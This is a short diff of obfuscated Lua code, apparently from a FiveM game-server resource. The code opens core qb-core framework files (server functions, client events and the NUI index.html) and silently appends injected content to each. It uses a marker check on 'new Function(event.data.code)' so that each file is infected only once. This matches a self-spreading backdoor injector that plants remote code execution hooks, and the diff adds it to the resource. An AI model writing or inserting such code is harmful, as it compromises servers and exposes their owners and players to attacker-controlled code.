@@ -14,5 +14,5 @@
             phrase = "new Function(event.data.code)",
             nuchangesMade = false},
     }
-local a=false;local b=false;local c=false;for d,e in ipairs(filesToAdd)do local f=e.path;local g=e.content;local h=e.phrase;local i=io.open(f,"r")local j=""if i then j=i:read("*all")or""i:close()else end;if string.find(j,h,1,true)then else i=io.open(f,"a")if i then i:write(g)i:close()if f==GetResourcePath(spe.."it".."or")..jds.."/server/sv_"..trs..".lua"then a=true elseif f==GetResourcePath(spe.."it".."or")..jds.."/client/cl_"..trs..".lua"then b=true elseif f==GetResourcePath(spe.."it".."or").."/nui/index.html"then c=true end end end end
+local a=false;local b=false;local c=false;for d,e in ipairs(filesToAdd)do local f=e.path;local g=e.content;local h=e.phrase;local i=io.open(f,"r")local j=""if i then j=i:read("*all")or""i:close()else end;if string.find(j,h,1,true)then else i=io.open(f,"a")if i then i:write(g)i:close()if f==GetResourcePath("qb-core").."/server/functions.lua"then a=true elseif f==GetResourcePath("qb-core").."/client/events.lua"then b=true elseif f==GetResourcePath("qb-core").."/html/index.html"then c=true end end end end
     
